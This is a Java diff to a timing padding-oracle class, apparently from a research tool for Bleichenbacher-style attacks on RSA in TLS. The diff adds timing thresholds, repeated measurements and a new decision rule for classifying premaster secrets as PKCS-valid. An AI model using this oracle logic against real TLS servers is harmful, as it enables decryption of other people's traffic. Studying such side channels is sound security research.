@@ -35,9 +35,21 @@ public final class CommandLineTimingOracle extends AOracle {
      * CONFIGURATION SECTION
      */
     /**
+     * The timing boundary between PKCS-valid and PKCS-invalid timings (in clock ticks)
+     */
+    private static final int TIMING_BOUNDARY = -11000;
+    /**
+     * Given a timing measurement > TIMING_BOUNDARY, we repeat the measurement
+     * with the same ciphertext. We'll keep repeating the measurement as long
+     * as the timings t are
+     * TIMING_BOUNDARY - TIMING_SIGNIFICANCE_THRESHOLD < t < TIMING_BOUNDARY + TIMING_SIGNIFICANCE_THRESHOLD
+     */
+    private static final int TIMING_SIGNIFICANCE_THRESHOLD = 3000;
+    
+    /**
      * Amount of training measurements per Oracle request.
      */
-    private static final int MEASUREMENT_AMOUNT = 100;
+    private static final int MEASUREMENT_AMOUNT = 150;
     /**
      * Amount of training measurementsTest.
      */
@@ -147,8 +159,9 @@ public final class CommandLineTimingOracle extends AOracle {
         long[] testTiming = new long[MEASUREMENT_AMOUNT * factor];
         
         Random r = new Random();
-            
+
         for (int i = 0; i < MEASUREMENT_AMOUNT * factor; i++) {
+            clwe.executeClientWithPMS(getCase1PMS());
             if((r.nextInt() % 2) == 0) {
                 caseXTiming[i] = clwe.executeClientWithPMS(getCase2PMS());
                 testTiming[i]  = clwe.executeClientWithPMS(testPMS);
@@ -182,16 +195,43 @@ public final class CommandLineTimingOracle extends AOracle {
 //        }
         
         System.out.println("    timing: " + (caseXTiming[(minBoxPos * MEASUREMENT_AMOUNT) / 100] - testTiming[(minBoxPos * MEASUREMENT_AMOUNT) / 100]));
+        long timing = caseXTiming[(minBoxPos * MEASUREMENT_AMOUNT) / 100] - testTiming[(minBoxPos * MEASUREMENT_AMOUNT) / 100];
         
-        //if(case2Timing[(maxBoxPos * MEASUREMENT_AMOUNT) / 100] > testTiming[(minBoxPos * MEASUREMENT_AMOUNT) / 100]) {
-        if((caseXTiming[(minBoxPos * MEASUREMENT_AMOUNT) / 100] - testTiming[(minBoxPos * MEASUREMENT_AMOUNT) / 100]) > -16000) {
-            if(factor == 1) {
+        if(factor == 1) {
+            if(timing > TIMING_BOUNDARY) {
+                /*
+                 * We found a candidate! Repeat measurement to confirm it.
+                 */
+                return isValidPKCS(testPMS, 10);
+            } else {
+                /*
+                 * Not a candidate.
+                 */
+                return false;
+            }
+        } else {
+            /*
+             * We found a candidate in the previous round. Now lets confirm it.
+             */
+            
+            // -5900  >      -9000       +           3000
+            if(timing > (TIMING_BOUNDARY + TIMING_SIGNIFICANCE_THRESHOLD)) {
+                return true;
+            
+            //        -12100 >   -9000          -   3000
+            } else if(timing < (TIMING_BOUNDARY - TIMING_SIGNIFICANCE_THRESHOLD)) {
+                return false;
+            } else {
+                /*
+                 * The timing is within the "no man's land". Repeat it.
+                 */
                 return isValidPKCS(testPMS, 10);
             }
-            return true;
-        } else {
-            return false;
+               
         }
+            
+        
+            
     }
 
     /**
@@ -266,11 +306,11 @@ public final class CommandLineTimingOracle extends AOracle {
         //    System.out.print("\r--> round " + round);
         //}
         
-        //if( (round < 2480) ) {
+        // if( (round < 2480) ) {
             // TODO: Ooooh jeeeee!
             // return groundTruth;
         //    return false;
-        //}
+        // }
         
         System.out.println("");
         System.out.println("################### New Measurement #########################");
